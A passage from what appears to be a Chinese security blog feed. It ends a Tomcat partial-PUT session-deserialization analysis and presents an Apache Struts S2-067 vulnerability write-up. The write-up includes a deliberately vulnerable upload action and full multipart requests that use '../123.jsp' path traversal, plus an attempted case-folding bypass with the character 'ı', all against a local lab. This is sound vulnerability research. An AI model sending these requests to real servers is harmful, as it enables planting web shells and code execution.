class="type">String</span> <span class="variable">convertedResourcePath</span> <span class="operator">=</span> path.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tempDir, convertedResourcePath);</span><br><span class="line">        <span class="keyword">if</span> (contentFile.createNewFile()) &#123;</span><br><span class="line">            contentFile.deleteOnExit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">randAccessContentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(contentFile, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">oldResource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="keyword">if</span> (oldResource.isFile()) &#123;</span><br><span class="line">                <span class="type">BufferedInputStream</span> <span class="variable">bufOldRevStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(oldResource.getInputStream(), <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">byte</span>[] copyBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> numBytesRead;</span><br><span class="line">                    <span class="keyword">while</span>((numBytesRead = bufOldRevStream.read(copyBuffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        randAccessContentFile.write(copyBuffer, <span class="number">0</span>, numBytesRead);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var17) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        bufOldRevStream.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var16) &#123;</span><br><span class="line">                        var17.addSuppressed(var16);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">throw</span> var17;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                bufOldRevStream.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            randAccessContentFile.setLength(range.length);</span><br><span class="line">            randAccessContentFile.seek(range.start);</span><br><span class="line">            <span class="type">byte</span>[] transferBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">requestBufInStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(req.getInputStream(), <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> numBytesRead;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span>((numBytesRead = requestBufInStream.read(transferBuffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    randAccessContentFile.write(transferBuffer, <span class="number">0</span>, numBytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var18) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    requestBufInStream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var15) &#123;</span><br><span class="line">                    var18.addSuppressed(var15);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> var18;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            requestBufInStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var19) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                randAccessContentFile.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var14) &#123;</span><br><span class="line">                var19.addSuppressed(var14);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> var19;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        randAccessContentFile.close();</span><br><span class="line">        <span class="keyword">return</span> contentFile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以神奇的发现，这里获取的路径也是从<code>javax.servlet.context.tempdir</code>获取的，那么在默认情况下相同 servlet 的临时工作目录自然也相同</p><p>继续看，这里会将 path 中 <code>/</code>替换为 <code>.</code>，而 path 则是请求的路径，所以如果请求为 <code>PUT /poc.session</code>到这处理后的convertedResourcePath 即 <code>.poc.session</code>，这里<code>contentFile.deleteOnExit()</code>并不是立即删除，而是标记删除，在退出 jvm 时会触发 hook，删除这个临时文件。然后的逻辑就会获取请求包的 body 根据 range 的偏移量写入到该文件中，并返回该 File 对象。</p><p>返回后的调用就是写入到 web 目录下的对应路径下</p><p>因此，这样就可以在 session 存放的目录写入携带恶意序列化流的 session 文件。在请求中携带 session 时就会寻找对应 session 文件，并反序列化恶意数据，达到利用目的。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说，利用条件是相当苛刻的，不仅得开启 PUT 还得开启 Tomcat 的 session 文件持久化，环境中还得存在可反序列化利用的依赖包。实际环境很难遇到，但思路还是很巧妙的。</p><p>了解不多，如果有分析出错的地方，请各位大牛多多指点！</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Struts S2-067 漏洞分析</title>
      <link href="/2024/12/20/Apache%20Struts%20S2-067%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/20/Apache%20Struts%20S2-067%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/">Apache-Struts2-文件上传逻辑绕过-CVE-2024-53677-S2-067 - y4tacker</a></p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache Struts 是一个开源的、用于构建企业级Java Web应用的MVC框架。2024年12月，Apache 官方披露 CVE-2024-53677 Apache Struts FileUploadInterceptor 文件上传漏洞。在受影响版本中，若代码中使用了FileUploadInterceptor，当进行文件上传时，攻击者可能构造恶意请求利用目录遍历等上传文件至其他目录，在特定场景下可能造成代码执行。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Struts 2.0.0 - Struts 2.3.37</p><p>Struts 2.5.0 - Struts 2.5.33</p><p>Struts 6.0.0 - Struts 6.3.0.2</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://github.com/proudwind/struts2_vulns/tree/master/s2vuls">https://github.com/proudwind/struts2_vulns/tree/master/s2vuls</a></p><p>第一次复现struts的漏洞，借助了这个项目搭建环境（自己尝试从零搭环境发现达不到预期效果，访问<code>upload.action</code>返回404，怪）</p><p>clone下来这个目录，然后根据需要增加自己的代码即可</p><p>修改pom.xml，依赖更换为漏洞版本，这里选用6.3.0.2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义一个UploadAction类</p><p><img src="https://s2.loli.net/2024/12/20/RxGv7CV6FIjEczN.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.ph0ebus.s2067.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> File upload;</span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(File upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> path + File.separator + <span class="built_in">this</span>.uploadFileName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.upload, <span class="keyword">new</span> <span class="title class_">File</span>(realPath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置struts.xml，通常在项目路径的&#x2F;WEB-INF&#x2F;classes路径下，添加这个action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;s2067&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.ph0ebus.s2067.action.UploadAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doUpload&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/sKTlkPfBRaXtrJo.png" alt="img"></p><p>web.xml当中filter配置好了，可以不用修改</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="单文件上传"><a href="#单文件上传" class="headerlink" title="单文件上传"></a>单文件上传</h2><p><img src="https://s2.loli.net/2024/12/20/zJyYUdKAj3MfD4g.png" alt="img"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;top.UploadFileName&quot;; </span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/DKyedJnrTWZIU3S.png" alt="img"></p><h2 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h2><p><img src="https://s2.loli.net/2024/12/20/UaKH72jLFn8rv9u.png" alt="img"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067s.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryq0PW93h6lyBzjZNZ</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>138</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;;filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>:  <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;uploadFileName[0]&quot;;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryq0PW93h6lyBzjZNZ--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/XI7hYi46bQBCP93.png" alt="img"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>官方漏洞通告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-067">https://cwiki.apache.org/confluence/display/WW/S2-067</a></p><blockquote><p>File upload logic is flawed, and allows an attacker to enable paths with traversals - similar problem as reported in <a href="https://cwiki.apache.org/confluence/display/WW/S2-066">S2-066</a></p></blockquote><p>由此可见，先分析一下S2-066这个漏洞…</p><p>[<a href="https://blog.ph0ebus.cn/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]">https://blog.ph0ebus.cn/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/]</a>(<a href="https://blog.ph0ebus.cn/2024/12/15/Apache">https://blog.ph0ebus.cn/2024/12/15/Apache</a> Struts S2-066 漏洞分析&#x2F;)</p><p>而这里的修复方案就是，<code>org.apache.struts2.dispatcher.HttpParameters#appendAll</code>中添加参数时，忽略大小写遍历删除同名参数再做添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.remove(newParams.keySet());</span><br><span class="line">    <span class="built_in">this</span>.parameters.putAll(newParams);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">remove</span><span class="params">(Set&lt;String&gt; paramsToRemove)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(String paramName : paramsToRemove) &#123;</span><br><span class="line">        <span class="built_in">this</span>.parameters.entrySet().removeIf((p) -&gt; ((String)p.getKey()).equalsIgnoreCase(paramName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/VJLKN8hjubq9mfT.png" alt="img"></p><p>在<code>FileUploadInterceptor#intercept</code>将文件上传的参数添加到参数列表时会用到<code>HttpParameters#appendAll</code>这个方法，于是原本利用简单的大小写转换的参数覆盖方式不可行</p><p>在分析S2-066的时候。我注意到一个很有意思的点，在<code>ognl.OgnlRuntime#capitalizeBeanPropertyName</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">capitalizeBeanPropertyName</span><span class="params">(String propertyName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (propertyName.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName.toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;set&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;)&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;is&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">2</span>, <span class="number">3</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进行了大写的转换，能联想到部分字符存在大小写转换的特性</p><p><a href="http://www.lvyyevd.cn/archives/java-yu-yan-zhong-da-xiao-xie-de-te-xing">http://www.lvyyevd.cn/archives/java-yu-yan-zhong-da-xiao-xie-de-te-xing</a></p><p>比如<code>ı</code>转换为大写可以得到字母<code>I</code>，于是能想到，如果上传的参数<code>name</code>第一个字母小写<code>i</code>，能否通过这个特性绕过呢？虽然即使能绕过也不具有通用意义，但是还是试了试</p><p><img src="https://s2.loli.net/2024/12/20/8uoprG1MDevUBac.png" alt="img"></p><p>简单写一个action，这里name设为inter，然后发包，尝试用<code>ınterFileName</code>覆盖</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2067test.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Inter&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;ınterFileName&quot;; </span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">../<span class="number">123.</span>jsp</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/AIxsSLzNOBv62Cu.png" alt="img"></p><p>不幸的是，这样还是会被<code>equalsIgnoreCase</code>方法检测到然后remove掉恶意参数，看看这个方法的实现逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 